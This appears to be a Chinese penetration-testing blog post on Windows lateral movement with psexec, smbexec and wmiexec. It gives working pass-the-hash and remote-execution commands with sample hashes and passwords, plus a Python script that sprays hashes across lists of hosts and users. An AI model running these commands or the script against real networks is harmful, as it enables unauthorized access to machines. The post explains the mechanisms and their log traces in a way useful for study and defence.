@@ -1,0 +1,364 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>psexec-smbexec-wmiexec横向移动 | Tptfb11&#39;S Blog</title>
+  <meta name="author" content="Tptfb11">
+  
+  <meta name="description" content="内网渗透横向移动.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="psexec-smbexec-wmiexec横向移动"/>
+  <meta property="og:site_name" content="Tptfb11&#39;S Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Tptfb11&#39;S Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Tptfb11&#39;S Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="归档文章.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="文章分类.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="文章标签.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tools" title="常用工具.">
+			  <i class="fa fa-fighter-jet"></i>Tools
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/notes" title="生活随笔.">
+			  <i class="fa fa-paper-plane"></i>Notes
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="关于我.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> psexec-smbexec-wmiexec横向移动</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 内网渗透横向移动.
+		 </div> <!-- alert -->
+	  		
+
+	  <h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><p>psexec是windows提供的工具，所以杀毒软件将其列在白名单中,，通过psexec可以将管理员权限提升至system权限以运行指定程序。psexec基本原理是：通过管道在远程计算机上创建一个psexec服务，并在本地磁盘中生成一个名为”PSESESVC”的二进制文件，然后通过psexec服务运行命令，运行结束后删除服务。首先需要获取目标操作系统的交互式shell。在建立ipc$的情况下，执行如下命令。获取system权限的shell。  </p>
+<p>psexec参数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框</span><br><span class="line">-u：用户名</span><br><span class="line">-p：密码</span><br><span class="line">-s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个连接所用用户权限的shell</span><br><span class="line">-i： 运行该程序，以便它与远程系统上指定会话的桌面进行交互。如果没有指定会话，进程将在控制台会话中运行</span><br></pre></td></tr></table></figure>
+
+<p>建立ipc连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ <span class="string">&quot;password&quot;</span> /user:username</span><br><span class="line"><span class="comment"># 关闭ipc连接</span></span><br><span class="line"><span class="comment"># net use \\ip\ipc$ /del </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255956.png" alt="img"></p>
+<p>命令执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># system权限执行</span></span><br><span class="line">psexec \\ip -s cmd /accepteula</span><br><span class="line"><span class="comment"># 当前用户执行</span></span><br><span class="line">PsExec.exe -accepteula \\ip -s cmd.exe /c <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255070.png" alt="img"></p>
+<p>无法获取密码时：psexec+PTH</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !官方Pstools无法采用hash连接</span></span><br><span class="line"><span class="comment"># 工作组</span></span><br><span class="line">psexec -hashes :$HASH$ ./administrator@192.168.52.143</span><br><span class="line"><span class="comment"># 域环境</span></span><br><span class="line">psexec -hashes :$HASH$ domain/administrator@10.1.2.3</span><br><span class="line"><span class="comment"># 测试 8a963371a63944419ec1adf687bb1be5</span></span><br></pre></td></tr></table></figure>
+
+<p>获得交互shell（后边加个参数可单条命令执行）</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255555.png" alt="img"></p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><ul>
+<li>将PSEXESVC.exe上传到ADMIN$（指向&#x2F;admin$&#x2F;system32&#x2F;PSEXESVC.EXE）共享文件夹内，也可能时其它共享文件夹内的随机可执行文件名称。如：存在exchange时共享文件夹为：address共享。</li>
+<li>远程创建用于运行PSEXESVC.exe的服务；</li>
+<li>远程启动服务。</li>
+</ul>
+<p>PSEXESVC服务充当一个重定向器。它在远程系统上运行指定的可执行文件（事例中的是cmd.exe）。同时，它通过主机之间来重定向进程的输入&#x2F;输出（利用命名管道）。</p>
+<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>1、需要远程系统开启admin共享（默认是开启的），原理是基于IPC共享，目标需要开放445端口和admin。在使用IPC连接目标系统后，不需要输入账户和密码。获取到一台机器时可查看是否有ipc连接记录。</p>
+<p>2、 在使用PsExec执行远程命令时，会在目标系统中创建一个psexec的服务。命令执行完后，psexec服务将被自动删除。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。  </p>
+<p>3、使用PsExec可以直接获得System权限的交互式Shell（前提目标是administrator权限的shell）</p>
+<p>4、在域环境测试时发现，非域用户无法利用内存中的票据使用PsExec功能，只能依靠账号和密码进行传递。</p>
+<h2 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h2><p> SMBExec 与 PSExec 非常相似，但是，SMBExec 不会将二进制文件放入磁盘。SMBExec 利用一个批处理文件和一个临时文件来执行和转发消息。与 PSExec 一样，SMBExec 通过 SMB 协议 (445&#x2F;TCP) 发送输入并接收输出。  </p>
+<h3 id="简单使用-1"><a href="#简单使用-1" class="headerlink" title="简单使用"></a>简单使用</h3><p>smbexec无需先ipc链接 明文或hash传递。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">smbexec god/administrator:Admin12345@192.168.3.21</span><br><span class="line">smbexec ./administrator:admin!@<span class="comment">#45@192.168.3.32</span></span><br><span class="line">smbexec -hashes :$HASH$ ./admin@192.168.3.21</span><br><span class="line">smbbexec -hashes :$HASH$ domain/admin@192.168.3.21</span><br><span class="line">smbexec -hashes :8a963371a63944419ec1adf687bb1be5 ./administrator@192.168.3.32</span><br><span class="line">smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21</span><br></pre></td></tr></table></figure>
+
+<p>​	明文：</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172255965.png" alt="img"></p>
+<p>hash：</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172256168.png" alt="img"></p>
+<h2 id="WMI服务和wmiexec"><a href="#WMI服务和wmiexec" class="headerlink" title="WMI服务和wmiexec"></a>WMI服务和wmiexec</h2><p>内网渗透中经常用到psexec这个工具，可以很方便的得到一个半交互式的cmd shell。但是psexec也有一些问题：psexec需要对方开启ADMIN$共享，而且需要安装服务，安装服务会留下明显的日志，而且服务没有删除的风险更大，管理员很容易就会发现。</p>
+<p>优点：不需要创建服务，在内存中运行，隐蔽性好</p>
+<p>缺点：⽹络请求较多；需要对⽅开启rpc服务。</p>
+<p>大致原理：先使用凭证与目标进行认证，再通过调用目标的wmi创建并启用服务，然后把结果输出到共享中，再通过IPC$读取结果。</p>
+<h3 id="简单使用-2"><a href="#简单使用-2" class="headerlink" title="简单使用"></a>简单使用</h3><p>服务利用，命令无回显，需要远程读取。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create <span class="string">&quot;cmd.exe /c  ipconfig &gt;C:\1.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>套件impacket wmiexec 明文或hash传递 有回显exe版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmiexec ./administrator:admin!@<span class="comment">#45@192.168.3.32 &quot;whoami&quot;</span></span><br><span class="line">wmiexec god/administrator:Admin12345@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :8a963371a63944419ec1adf687bb1be5 ./administrator@192.168.3.32 <span class="string">&quot;whoami&quot;</span></span><br><span class="line">wmiexec -hashes :8a963371a63944419ec1adf687bb1be5 god/administrator@192.168.3.21 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221115202211172256454.png" alt="img"></p>
+<h2 id="实战利用"><a href="#实战利用" class="headerlink" title="实战利用"></a>实战利用</h2><p>当端口结果中的某台主机开启了139、445，但是没开启3389.可通过psexec，命令执行。为了实现批量探测可以编写python脚本，然后编译成exe在跳板机上执行&gt;</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mack&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">hashs=&#123;</span><br><span class="line">    <span class="string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">	<span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">		<span class="keyword">for</span> mimahash <span class="keyword">in</span> hashs:</span><br><span class="line">			<span class="comment">#wmiexec -hashes :hash god/user@ip whoami</span></span><br><span class="line">			<span class="built_in">exec</span> = <span class="string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="string">&quot; god/&quot;</span>+user+<span class="string">&quot;@&quot;</span>+ip+<span class="string">&quot; whoami&quot;</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + <span class="built_in">exec</span> + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">			os.system(<span class="built_in">exec</span>)</span><br><span class="line">			time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+	</div>
+
+	
+	<span id="/2022/11/15/psexec-smbexec-wmiexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="leancloud-visitors view" data-flag-title="psexec-smbexec-wmiexec横向移动">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2022/11/17/kerberos网络身份认证-PTT-ms14068/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/11/15/notes/这是测试/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"T4cIyHys5R6e08AOwUNWgymj-gzGzoHsz","appKey":"J1TTypyuxpKKmz37Rd7oQ9tE","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-11-15 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/横向移动/">横向移动<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/内网渗透/">内网渗透<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#psexec"><span class="toc-article-text">psexec</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="toc-article-text">简单使用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-article-text">工作原理</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">注意事项</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#smbexec"><span class="toc-article-text">smbexec</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8-1"><span class="toc-article-text">简单使用</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WMI%E6%9C%8D%E5%8A%A1%E5%92%8Cwmiexec"><span class="toc-article-text">WMI服务和wmiexec</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8-2"><span class="toc-article-text">简单使用</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-article-text">实战利用</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Tptfb11's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
